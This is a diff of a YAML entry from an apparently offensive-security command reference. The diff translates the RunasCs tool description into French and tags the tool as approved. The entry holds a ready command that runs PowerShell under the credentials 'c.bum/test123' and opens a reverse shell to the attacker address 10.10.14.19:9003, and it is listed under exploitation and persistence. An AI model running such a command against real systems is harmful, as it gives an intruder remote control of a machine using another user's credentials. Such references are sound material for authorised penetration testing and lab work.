@@ -1,17 +1,17 @@
 ---
 description: |
-  RunasCs is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin runas.exe that solves some limitations.
+  RunasCs est un utilitaire qui permet d'exécuter des processus spécifiques avec des autorisations différentes de celles de la connexion actuelle de l'utilisateur, à l'aide d'informations d'identification explicites. Cet outil est une version améliorée et ouverte de runas.exe, le programme intégré de Windows, qui résout certaines limitations.
 
   Command Reference:
-  ```
-  Username: c.bum
 
-  Password: test123
+    Username: c.bum
 
-  Command: Powershell
+    Password: test123
 
-  Attacker IP & port for reverse shell: 10.10.14.19:9003
-  ```
+    Command: Powershell
+
+    Attacker IP & port for reverse shell: 10.10.14.19:9003
+
 command: |
   .\RunasCs.exe c.bum test123 powershell -r 10.10.14.19:9003
 
@@ -21,6 +21,7 @@ services:
   - 
 OS:
   - Windows
+  - Approved-tool
 attack_types:
   - Exploitation
   - Persistance
